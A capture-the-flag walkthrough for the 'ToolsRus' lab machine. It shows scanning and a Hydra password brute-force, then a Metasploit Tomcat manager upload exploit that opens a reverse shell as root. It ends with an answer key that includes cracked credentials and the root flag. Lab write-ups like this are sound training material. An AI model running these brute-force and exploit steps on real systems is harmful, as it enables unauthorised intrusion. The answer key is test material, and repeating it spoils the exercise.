# ToolsRus - Easy

```shell
nmap -T4 -A 10.10.75.77

gobuster dir -u http://10.10.75.77 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

gobuster dir -u http://10.10.75.77:1234 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.75.77 http-get "/protected"
#cracks the creds

nikto -h http://10.10.75.77:1234/manager/html -id bob:bubbles
#nikto scan with creds

msfconsole
#following the exploit found on Google

use exploit/multi/http/tomcat_mgr_upload

show options

set HttpPassword bubbles

set HttpUsername bob

set RHOSTS 10.10.75.77

set RPORT 1234

set LHOST 10.11.85.177

run
#run the exploit
#this gives us meterpreter shell

getuid
#we are root

cat /root/flag.txt
#root flag
```

```markdown
nmap scan gives the following open ports and services:

  * 22 - ssh - OpenSSH 7.2p2 (Ubuntu)
  * 80 - http - Apache httpd 2.4.18
  * 1234 - http - Apache Tomcat (7.0.88) / Coyote JSP engine 1.1
  * 8009 - ajp13 - Apache Jserv (v1.3)

Using gobuster, we look for web directories:

  * /guidelines
  * /index.html
  * /protected

From the /guidelines page, we get the name 'bob' and the text hints us about a TomCat vulnerability.

Also, the /protected page has basic authentication, so we need to find valid creds.

We can use Hydra to crack the password for /protected; as it is using basic authentication, we have to use 'http-get' in Hydra.

Even though the credentials are authenticated in base64, as it is basic authentication, we just need to use the standard Hydra command for http-get.

Cracking it gives us the creds bob:bubbles; after logging in, the /protected page shows that it has moved to a different port, referring to port 1234.

We also check the web server on port 1234, which is running Apache Tomcat/7.0.88.

Using gobuster, we look for web directories on port 1234:

  * /docs
  * /examples
  * /favicon.ico
  * /host-manager
  * /manager

Now, according to the given instructions, we need to use the creds in /manager/html on port 1234 and scan the page using Nikto.

We need to search for the exploit now which will give us a shell; we need to do so by using the versions of the services enumerated earlier.

Googling for 'Apache Coyote 1.1 exploit' leads us to <https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote>, which covers getting a shell in msfconsole.

We will use the tomcat_mgr_upload to get shell as we have the creds bob:bubbles for access.
```

1. What directory can you find, that begins with a "g"? - guidelines

2. Whose name can you find from this directory? - bob

3. What directory has basic authentication? - protected

4. What is bob's password to the protected part of the website? - bubbles

5. What other port that serves a web service is open on the machine? - 1234

6. Going to the service running on that port, what is the name and version of the software? - Apache Tomcat/7.0.88

7. How many documentation files did Nikto identify? - 5

8. What is the server version? - Apache/2.4.18

9. What version of Apache-Coyote is this service running? - 1.1

10. What user did you get a shell as? - root

11. What text is in the file /root/flag.txt? - ff1fc4a81affcc7688cf89ae7dc6e0e1
